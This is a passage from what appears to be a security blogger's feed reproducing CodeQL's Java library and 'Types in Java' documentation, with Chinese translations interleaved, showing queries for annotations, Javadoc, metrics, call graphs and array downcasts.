class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;1016821702972128245&#x2F;). Most projects have many method bodies.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。大多数项目都有许多方法体。</span><br><span class="line"></span><br><span class="line">As these examples show, the parent node of an expression is not always an expression: it may also be a statement, for example, an &#96;IfStmt&#96;. Similarly, the parent node of a statement is not always a statement: it may also be a method or a constructor. To capture this, the QL Java library provides two abstract class &#96;ExprParent&#96; and &#96;StmtParent&#96;, the former representing any node that may be the parent node of an expression, and the latter any node that may be the parent node of a statement.</span><br><span class="line"></span><br><span class="line">&gt; 正如这些示例所示，一个表达式的父节点并不总是一个表达式：它也可能是一个语句，例如，一个 IfStmt。同样，一个语句的父节点也不总是一个语句：它也可能是一个方法或构造函数。为了抓住这一点，QL Java库提供了两个抽象类ExprParent和StmtParent，前者代表任何可能是表达式的父节点，后者代表任何可能是语句的父节点。</span><br><span class="line"></span><br><span class="line">For more information on working with AST classes, see the [article on overflow-prone comparisons in Java](https:&#x2F;&#x2F;codeql.github.com&#x2F;docs&#x2F;codeql-language-guides&#x2F;overflow-prone-comparisons-in-java&#x2F;).</span><br><span class="line"></span><br><span class="line">&gt; 有关使用AST类的更多信息，请参见 [article on overflow-prone comparisons in Java](https:&#x2F;&#x2F;codeql.github.com&#x2F;docs&#x2F;codeql-language-guides&#x2F;overflow-prone-comparisons-in-java&#x2F;).。</span><br><span class="line"></span><br><span class="line">## Metadata</span><br><span class="line"></span><br><span class="line">Java programs have several kinds of metadata, in addition to the program code proper. In particular, there are [annotations](https:&#x2F;&#x2F;docs.oracle.com&#x2F;javase&#x2F;tutorial&#x2F;java&#x2F;annotations&#x2F;) and [Javadoc](https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Javadoc) comments. Since this metadata is interesting both for enhancing code analysis and as an analysis subject in its own right, the QL library defines classes for accessing it.</span><br><span class="line"></span><br><span class="line">&gt; Java程序除了程序代码本身外，还有几种元数据。特别是有注释和Javadoc注释。由于这些元数据对于增强代码分析和作为分析对象本身都很有趣，QL库定义了用于访问这些元数据的类。</span><br><span class="line"></span><br><span class="line">For annotations, class &#96;Annotatable&#96; is a superclass of all program elements that can be annotated. This includes packages, reference types, fields, methods, constructors, and local variable declarations. For every such element, its predicate &#96;getAnAnnotation&#96; allows you to retrieve any annotations the element may have. For example, the following query finds all annotations on constructors:</span><br><span class="line"></span><br><span class="line">&gt; 对于注释，类Annotatable是所有可以注释的程序元素的超类。这包括包、引用类型、字段、方法、构造器和局部变量声明。对于每一个这样的元素，它的谓词getAnAnnotation允许你检索该元素可能拥有的任何注释。例如，下面的查询可以找到所有关于构造函数的注解:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Constructor c<br>select c.getAnAnnotation()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;3206112561297137365&#x2F;). The LGTM.com demo projects all use annotations, you can see examples where they are used to suppress warnings and mark code as deprecated.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在 LGTM.com 的查询控制台中可以看到。LGTM.com 演示项目都使用了注解，您可以看到使用注解来抑制警告和将代码标记为废弃的例子。</span><br><span class="line"></span><br><span class="line">These annotations are represented by class &#96;Annotation&#96;. An annotation is simply an expression whose type is an &#96;AnnotationType&#96;. For example, you can amend this query so that it only reports deprecated constructors:</span><br><span class="line"></span><br><span class="line">&gt; 这些注解由类Annotation表示。注释是一个简单的表达式，其类型是AnnotationType。例如，你可以修改这个查询，使它只报告废弃的构造函数:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Constructor c, Annotation ann, AnnotationType anntp<br>where ann = c.getAnAnnotation() and<br>    anntp = ann.getType() and<br>    anntp.hasQualifiedName(“java.lang”, “Deprecated”)<br>select ann</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;5393027107459215059&#x2F;). Only constructors with the &#96;@Deprecated&#96; annotation are reported this time.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。这次只报告带有 @Deprecated 注解的构造函数。</span><br><span class="line"></span><br><span class="line">For more information on working with annotations, see the [article on annotations](https:&#x2F;&#x2F;codeql.github.com&#x2F;docs&#x2F;codeql-language-guides&#x2F;annotations-in-java&#x2F;).</span><br><span class="line"></span><br><span class="line">&gt; 有关使用注解的更多信息，请参阅关于注解的文章。</span><br><span class="line"></span><br><span class="line">For Javadoc, class &#96;Element&#96; has a member predicate &#96;getDoc&#96; that returns a delegate &#96;Documentable&#96; object, which can then be queried for its attached Javadoc comments. For example, the following query finds Javadoc comments on private fields:</span><br><span class="line"></span><br><span class="line">&gt; 对于Javadoc来说，类Element有一个成员谓词getDoc，它可以返回一个委派的Documentable对象，然后可以查询其附加的Javadoc注释。例如，下面的查询可以找到私有字段的Javadoc注释:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Field f, Javadoc jdoc<br>where f.isPrivate() and<br>    jdoc = f.getDoc().getJavadoc()<br>select jdoc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;6022769142134600659&#x2F;). You can see this pattern in many projects.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。在很多项目中都可以看到这种模式。</span><br><span class="line"></span><br><span class="line">Class &#96;Javadoc&#96; represents an entire Javadoc comment as a tree of &#96;JavadocElement&#96; nodes, which can be traversed using member predicates &#96;getAChild&#96; and &#96;getParent&#96;. For instance, you could edit the query so that it finds all &#96;@author&#96; tags in Javadoc comments on private fields:</span><br><span class="line"></span><br><span class="line">&gt; 类 Javadoc 将整个 Javadoc 注释表示为 JavadocElement 节点的树，可以使用成员谓词 getAChild 和 getParent 遍历。例如，你可以编辑查询，使其找到私有字段的Javadoc注释中的所有@author标签:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Field f, Javadoc jdoc, AuthorTag at<br>where f.isPrivate() and<br>    jdoc = f.getDoc().getJavadoc() and<br>    at.getParent+() = jdoc<br>select at</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;2510220694395289111&#x2F;). None of the LGTM.com demo projects uses the &#96;@author&#96; tag on private fields.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在 LGTM.com 的查询控制台中可以看到。LGTM.com 演示项目中没有一个在私有字段上使用 @author 标签。</span><br><span class="line"></span><br><span class="line">&gt; Note</span><br><span class="line">&gt;</span><br><span class="line">&gt; On line 5 we used &#96;getParent+&#96; to capture tags that are nested at any depth within the Javadoc comment.</span><br><span class="line">&gt;</span><br><span class="line">&gt; 在第5行，我们使用getParent+来捕获Javadoc注释中任意深度嵌套的标签。</span><br><span class="line"></span><br><span class="line">For more information on working with Javadoc, see the [article on Javadoc](https:&#x2F;&#x2F;codeql.github.com&#x2F;docs&#x2F;codeql-language-guides&#x2F;javadoc&#x2F;).</span><br><span class="line"></span><br><span class="line">&gt; 关于使用 Javadoc 的更多信息，请看关于 Javadoc 的文章。</span><br><span class="line"></span><br><span class="line">## Metrics</span><br><span class="line"></span><br><span class="line">The standard QL Java library provides extensive support for computing metrics on Java program elements. To avoid overburdening the classes representing those elements with too many member predicates related to metric computations, these predicates are made available on delegate classes instead.</span><br><span class="line"></span><br><span class="line">&gt; 标准QL Java库为Java程序元素的度量计算提供了广泛的支持。为了避免与度量计算相关的成员谓词过多而给代表这些元素的类造成过重的负担，这些谓词被放在委托类上。</span><br><span class="line"></span><br><span class="line">Altogether, there are six such classes: &#96;MetricElement&#96;, &#96;MetricPackage&#96;, &#96;MetricRefType&#96;, &#96;MetricField&#96;, &#96;MetricCallable&#96;, and &#96;MetricStmt&#96;. The corresponding element classes each provide a member predicate &#96;getMetrics&#96; that can be used to obtain an instance of the delegate class, on which metric computations can then be performed.</span><br><span class="line"></span><br><span class="line">&gt; 一共有六个这样的类。MetricElement、MetricPackage、MetricRefType、MetricField、MetricCallable和MetricStmt。相应的元素类都提供了一个成员谓词getMetrics，可以用来获取委托类的实例，然后在这个实例上进行度量计算。</span><br><span class="line"></span><br><span class="line">For example, the following query finds methods with a [cyclomatic complexity](https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Cyclomatic_complexity) greater than 40:</span><br><span class="line"></span><br><span class="line">&gt; 例如，下面的查询可以找到循环复杂度大于40的方法:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Method m, MetricCallable mc<br>where mc = m.getMetrics() and<br>    mc.getCyclomaticComplexity() &gt; 40<br>select m</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;6566950741051181919&#x2F;). Most large projects include some methods with a very high cyclomatic complexity. These methods are likely to be difficult to understand and test.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。大多数大型项目都包括一些具有非常高循环复杂性的方法。这些方法可能难以理解和测试。</span><br><span class="line"></span><br><span class="line">## Call graph</span><br><span class="line"></span><br><span class="line">CodeQL databases generated from Java code bases include precomputed information about the program’s call graph, that is, which methods or constructors a given call may dispatch to at runtime.</span><br><span class="line"></span><br><span class="line">&gt; 由Java代码库生成的CodeQL数据库中包含了关于程序调用图的预计算信息，即一个给定的调用在运行时可能会派发给哪些方法或构造函数。</span><br><span class="line"></span><br><span class="line">The class &#96;Callable&#96;, introduced above, includes both methods and constructors. Call expressions are abstracted using class &#96;Call&#96;, which includes method calls, &#96;new&#96; expressions, and explicit constructor calls using &#96;this&#96; or &#96;super&#96;.</span><br><span class="line"></span><br><span class="line">&gt; 上文介绍的类Callable既包括方法，也包括构造器。调用表达式是用类Call抽象出来的，它包括方法调用、新表达式和使用this或super的显式构造函数调用。</span><br><span class="line"></span><br><span class="line">We can use predicate &#96;Call.getCallee&#96; to find out which method or constructor a specific call expression refers to. For example, the following query finds all calls to methods called &#96;println&#96;:</span><br><span class="line"></span><br><span class="line">&gt; 我们可以使用谓词Call.getCallee来查找一个特定的调用表达式指的是哪个方法或构造函数。例如，下面的查询可以找到所有调用println的方法:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Call c, Method m<br>where m = c.getCallee() and<br>    m.hasName(“println”)<br>select c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➤ [See this in the query console on LGTM.com](https:&#x2F;&#x2F;lgtm.com&#x2F;query&#x2F;5861255162551917595&#x2F;). The LGTM.com demo projects all include many calls to methods of this name.</span><br><span class="line"></span><br><span class="line">&gt; ➤ 在LGTM.com的查询控制台中可以看到。LGTM.com 的演示项目都包含许多对这个名称的方法的调用。</span><br><span class="line"></span><br><span class="line">Conversely, &#96;Callable.getAReference&#96; returns a &#96;Call&#96; that refers to it. So we can find methods and constructors that are never called using this query:</span><br><span class="line"></span><br><span class="line">&gt; 反之，Callable.getAReference返回一个引用它的Call。所以我们可以使用这个查询找到从未被调用的方法和构造函数:</span><br></pre></td></tr></table></figure><p>import java</p><p>from Callable c<br>where not exists(c.getAReference())<br>select c</p><p>```</p><p>➤ <a href="https://lgtm.com/query/7261739919657747703/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. The LGTM.com demo projects all appear to have many methods that are not called directly, but this is unlikely to be the whole story. To explore this area further, see “<a href="https://codeql.github.com/docs/codeql-language-guides/navigating-the-call-graph/" target="_blank" rel="noopener">Navigating the call graph</a>.”</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。LGTM.com 演示项目似乎都有许多方法没有被直接调用，但这不可能是全部。要进一步探索这个领域，请参见 “导航调用图”。</p></blockquote><p>For more information about callables and calls, see the <a href="https://codeql.github.com/docs/codeql-language-guides/navigating-the-call-graph/" target="_blank" rel="noopener">article on the call graph</a>.</p><blockquote><p>关于可调用和调用的更多信息，请参见关于调用图的文章。</p></blockquote><h2 id="Further-reading"><a href="#Further-reading" class="headerlink" title="Further reading"></a>Further reading</h2><ul><li><p><a href="https://github.com/github/codeql/tree/main/java/ql/src" target="_blank" rel="noopener">CodeQL queries for Java</a></p></li><li><p><a href="https://github.com/github/codeql/tree/main/java/ql/examples" target="_blank" rel="noopener">Example queries for Java</a></p></li><li><p><a href="https://codeql.github.com/codeql-standard-libraries/java/" target="_blank" rel="noopener">CodeQL library reference for Java</a></p></li><li><p>“<a href="https://codeql.github.com/docs/ql-language-reference/#ql-language-reference" target="_blank" rel="noopener">QL language reference</a>”</p></li><li><p>“<a href="https://codeql.github.com/docs/codeql-overview/codeql-tools/#codeql-tools" target="_blank" rel="noopener">CodeQL tools</a>”</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CodeQL-library-for-Java¶&quot;&gt;&lt;a href=&quot;#CodeQL-library-for-Java¶&quot; class=&quot;headerlink&quot; title=&quot;CodeQL library for Java¶&quot;&gt;&lt;/a&gt;CodeQL library
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Types in Java</title>
    <link href="https://summersec.github.io/2021/03/24/Types%20in%20Java/"/>
    <id>https://summersec.github.io/2021/03/24/Types%20in%20Java/</id>
    <published>2021-03-24T08:01:42.000Z</published>
    <updated>2021-03-25T09:00:28.851Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Types-in-Java¶"><a href="#Types-in-Java¶" class="headerlink" title="Types in Java¶"></a>Types in Java<a href="https://codeql.github.com/docs/codeql-language-guides/types-in-java/#types-in-java" target="_blank" rel="noopener">¶</a></h1><p>You can use CodeQL to find out information about data types used in Java code. This allows you to write queries to identify specific type-related issues.</p><blockquote><p>您可以使用CodeQL来查找Java代码中使用的数据类型的信息。这允许您编写查询以确定特定的类型相关问题。</p></blockquote><h2 id="About-working-with-Java-types"><a href="#About-working-with-Java-types" class="headerlink" title="About working with Java types"></a>About working with Java types</h2><p>The standard CodeQL library represents Java types by means of the <code>Type</code> class and its various subclasses.</p><blockquote><p>标准CodeQL库通过Type类及其各种子类来表示Java类型。</p></blockquote><p>In particular, class <code>PrimitiveType</code> represents primitive types that are built into the Java language (such as <code>boolean</code> and <code>int</code>), whereas <code>RefType</code> and its subclasses represent reference types, that is classes, interfaces, array types, and so on. This includes both types from the Java standard library (like <code>java.lang.Object</code>) and types defined by non-library code.</p><blockquote><p>特别是，类PrimitiveType表示Java语言中内置的基元类型（如boolean和int），而RefType及其子类则表示引用类型，即类、接口、数组类型等。其中既包括Java标准库中的类型（如java.lang.Object），也包括非库代码定义的类型。</p></blockquote><p>Class <code>RefType</code> also models the class hierarchy: member predicates <code>getASupertype</code> and <code>getASubtype</code> allow you to find a reference type’s immediate super types and sub types. For example, consider the following Java program:</p><blockquote><p>类RefType还对类的层次结构进行了建模：成员谓词getASupertype和getASubtype允许你找到一个引用类型的直属超类型和子类型。例如，考虑以下Java程序:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125;</span><br><span class="line"></span><br><span class="line">interface I &#123;&#125;</span><br><span class="line"></span><br><span class="line">class B extends A implements I &#123;&#125;</span><br></pre></td></tr></table></figure><p>Here, class <code>A</code> has exactly one immediate super type (<code>java.lang.Object</code>) and exactly one immediate sub type (<code>B</code>); the same is true of interface <code>I</code>. Class <code>B</code>, on the other hand, has two immediate super types (<code>A</code> and <code>I</code>), and no immediate sub types.</p><blockquote><p>在这里，类A正好有一个直系超级类型（java.lang.Object）和一个直系子类型（B）；接口I也是如此；而类B则有两个直系超级类型（A和I），没有直系子类型。</p></blockquote><p>To determine ancestor types (including immediate super types, and also <em>their</em> super types, etc.), we can use transitive closure. For example, to find all ancestors of <code>B</code> in the example above, we could use the following query:</p><blockquote><p>为了确定祖先类型（包括直系超类型，也包括它们的超类型等），我们可以使用转义闭包。例如，要找到上面例子中B的所有祖先，我们可以使用下面的查询:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class B</span><br><span class="line">where B.hasName(&quot;B&quot;)</span><br><span class="line">select B.getASupertype+()</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/1506430738755934285/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. If this query were run on the example snippet above, the query would return <code>A</code>, <code>I</code>, and <code>java.lang.Object</code>.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。如果在上面的示例片段上运行此查询，查询将返回 A、I 和 java.lang.Object。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/2u09er2ec/2u09er2ec.png" alt="image-20210324160901936"></p><p><img src="https://gitee.com/samny/images/raw/master/5u11er5ec/5u11er5ec.png" alt="image-20210324161105048"></p><blockquote><p>Tip</p><p>If you want to see the location of <code>B</code> as well as <code>A</code>, you can replace <code>B.getASupertype+()</code> with <code>B.getASupertype*()</code> and re-run the query.</p><p>如果想查看B的位置以及A的位置，可以将B.getASupertype+()替换为B.getASupertype*()，然后重新运行查询。</p></blockquote><p>Besides class hierarchy modeling, <code>RefType</code> also provides member predicate <code>getAMember</code> for accessing members (that is, fields, constructors, and methods) declared in the type, and predicate <code>inherits(Method m)</code> for checking whether the type either declares or inherits a method <code>m</code>.</p><blockquote><p>除了类的层次结构建模，RefType还提供了成员谓词getAMember用于访问在类型中声明的成员(即字段、构造函数和方法)，以及谓词 inherits(Method m)用于检查类型是否声明或继承了方法m。</p></blockquote><h2 id="Example-Finding-problematic-array-casts"><a href="#Example-Finding-problematic-array-casts" class="headerlink" title="Example: Finding problematic array casts"></a>Example: Finding problematic array casts</h2><p>As an example of how to use the class hierarchy API, we can write a query that finds downcasts on arrays, that is, cases where an expression <code>e</code> of some type <code>A[]</code> is converted to type <code>B[]</code>, such that <code>B</code> is a (not necessarily immediate) subtype of <code>A</code>.</p><blockquote><p>作为如何使用类层次结构 API 的一个例子，我们可以写一个查询来查找数组上的降维，也就是将某个类型 A[]的表达式 e 转换为类型 B[]的情况，这样 B 就是 A 的一个（不一定是直接）子类型。</p></blockquote><p>This kind of cast is problematic, since downcasting an array results in a runtime exception, even if every individual array element could be downcast. For example, the following code throws a <code>ClassCastException</code>:</p><blockquote><p>这种类型的转码是有问题的，因为即使每个数组元素都可以被转码，但降码一个数组会导致一个运行时异常。例如，下面的代码会抛出一个ClassCastException:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] o &#x3D; new Object[] &#123; &quot;Hello&quot;, &quot;world&quot; &#125;;</span><br><span class="line">String[] s &#x3D; (String[])o;</span><br></pre></td></tr></table></figure><p>If the expression <code>e</code> happens to actually evaluate to a <code>B[]</code> array, on the other hand, the cast will succeed:</p><blockquote><p>另一方面，如果表达式e恰好真的评估为一个B[]数组，那么投值就会成功:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object[] o &#x3D; new String[] &#123; &quot;Hello&quot;, &quot;world&quot; &#125;;</span><br><span class="line">String[] s &#x3D; (String[])o;</span><br></pre></td></tr></table></figure><p>In this tutorial, we don’t try to distinguish these two cases. Our query should simply look for cast expressions <code>ce</code> that cast from some type <code>source</code> to another type <code>target</code>, such that:</p><blockquote><p>在本教程中，我们不试图区分这两种情况。我们的查询应该简单地寻找从某个类型的源投射到另一个类型的目标的投射表达式ce，这样:</p></blockquote><ul><li>Both <code>source</code> and <code>target</code> are array types. 源和目标都是数组类型</li><li>The element type of <code>source</code> is a transitive super type of the element type of <code>target</code>. source的元素类型是target的元素类型的转义超类型。</li></ul><p>This recipe is not too difficult to translate into a query:</p><blockquote><p>这个口诀翻译成查询并不难:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from CastExpr ce, Array source, Array target</span><br><span class="line">where source &#x3D; ce.getExpr().getType() and</span><br><span class="line">    target &#x3D; ce.getType() and</span><br><span class="line">    target.getElementType().(RefType).getASupertype+() &#x3D; source.getElementType()</span><br><span class="line">select ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/8378564667548381869/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. Many projects return results for this query.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。许多项目都会返回此查询的结果。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/49u11er49ec/49u11er49ec.png" alt="image-20210324161149391"></p><p><img src="https://gitee.com/samny/images/raw/master/7u12er7ec/7u12er7ec.png" alt="image-20210324161207361"></p><p>Note that by casting <code>target.getElementType()</code> to a <code>RefType</code>, we eliminate all cases where the element type is a primitive type, that is, <code>target</code> is an array of primitive type: the problem we are looking for cannot arise in that case. Unlike in Java, a cast in QL never fails: if an expression cannot be cast to the desired type, it is simply excluded from the query results, which is exactly what we want.</p><blockquote><p>请注意，通过将 target.getElementType() 铸造为 RefType，我们消除了元素类型是基元类型的所有情况，即 target 是基元类型的数组：在这种情况下不能出现我们要找的问题。与Java中不同的是，QL中的转置永远不会失败：如果一个表达式不能被转置到所需的类型，它就会被排除在查询结果之外，这正是我们想要的。</p></blockquote><h3 id="Improvements"><a href="#Improvements" class="headerlink" title="Improvements"></a>Improvements</h3><p>Running this query on old Java code, before version 5, often returns many false positive results arising from uses of the method <code>Collection.toArray(T[])</code>, which converts a collection into an array of type <code>T[]</code>.</p><blockquote><p>在版本5之前的旧Java代码上运行这个查询，经常会返回许多假阳性结果，这是因为使用了Collection.toArray(T[])方法，该方法将一个集合转换为T[]类型的数组。</p></blockquote><p>In code that does not use generics, this method is often used in the following way:</p><blockquote><p>在不使用泛型的代码中，这个方法经常以如下方式使用:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List l &#x3D; new ArrayList();</span><br><span class="line">&#x2F;&#x2F; add some elements of type A to l</span><br><span class="line">A[] as &#x3D; (A[])l.toArray(new A[0]);</span><br></pre></td></tr></table></figure><p>Here, <code>l</code> has the raw type <code>List</code>, so <code>l.toArray</code> has return type <code>Object[]</code>, independent of the type of its argument array. Hence the cast goes from <code>Object[]</code> to <code>A[]</code> and will be flagged as problematic by our query, although at runtime this cast can never go wrong.</p><blockquote><p>这里，l具有原始类型List，所以l.toArray的返回类型是Object[]，与其参数数组的类型无关。因此，从Object[]到A[]的转码会被我们的查询标记为有问题，尽管在运行时这个转码永远不会出错。</p></blockquote><p>To identify these cases, we can create two CodeQL classes that represent, respectively, the <code>Collection.toArray</code> method, and calls to this method or any method that overrides it:</p><blockquote><p>为了识别这些情况，我们可以创建两个CodeQL类，分别代表Collection.toArray方法，以及对这个方法或任何覆盖它的方法的调用。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** class representing java.util.Collection.toArray(T[]) *&#x2F;</span><br><span class="line">&#x2F;**代表java.util.Collection.toArray(T[])的类 *&#x2F;</span><br><span class="line"></span><br><span class="line">class CollectionToArray extends Method &#123;</span><br><span class="line">    CollectionToArray() &#123;</span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;) and</span><br><span class="line">        this.hasName(&quot;toArray&quot;) and</span><br><span class="line">        this.getNumberOfParameters() &#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;** class representing calls to java.util.Collection.toArray(T[]) *&#x2F;</span><br><span class="line">&#x2F;**代表对java.util.Collection.toArray(T[])的调用的类 ***</span><br><span class="line"></span><br><span class="line">class CollectionToArrayCall extends MethodAccess &#123;</span><br><span class="line">    CollectionToArrayCall() &#123;</span><br><span class="line">        exists(CollectionToArray m |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overridesOrInstantiates*(m)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;** the call&#39;s actual return type, as determined from its argument *&#x2F;</span><br><span class="line">        &#x2F;** 调用的实际返回类型，由其参数决定*&#x2F;*。</span><br><span class="line"></span><br><span class="line">    Array getActualReturnType() &#123;</span><br><span class="line">        result &#x3D; this.getArgument(0).getType()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Notice the use of <code>getSourceDeclaration</code> and <code>overridesOrInstantiates</code> in the constructor of <code>CollectionToArrayCall</code>: we want to find calls to <code>Collection.toArray</code> and to any method that overrides it, as well as any parameterized instances of these methods. In our example above, for instance, the call <code>l.toArray</code> resolves to method <code>toArray</code> in the raw class <code>ArrayList</code>. Its source declaration is <code>toArray</code> in the generic class <code>ArrayList&lt;T&gt;</code>, which overrides <code>AbstractCollection&lt;T&gt;.toArray</code>, which in turn overrides <code>Collection&lt;T&gt;.toArray</code>, which is an instantiation of <code>Collection.toArray</code> (since the type parameter <code>T</code> in the overridden method belongs to <code>ArrayList</code> and is an instantiation of the type parameter belonging to <code>Collection</code>).</p><blockquote><p>注意在CollectionToArrayCall的构造函数中使用了getSourceDeclaration和overridesOrInstantiates：我们要找到对Collection.toArray和任何覆盖它的方法的调用，以及这些方法的任何参数化实例。例如，在我们上面的例子中，调用l.toArray解析到原始类ArrayList中的方法toArray。它的源声明是通用类ArrayList<T>中的toArray，它覆盖了AbstractCollection<T>.toArray，而AbstractCollection<T>.toArray又覆盖了Collection<T>.toArray，它是Collection.toArray的一个实例化（因为覆盖方法中的类型参数T属于ArrayList，是属于Collection的类型参数的实例化）。</T></T></T></T></p></blockquote><p>Using these new classes we can extend our query to exclude calls to <code>toArray</code> on an argument of 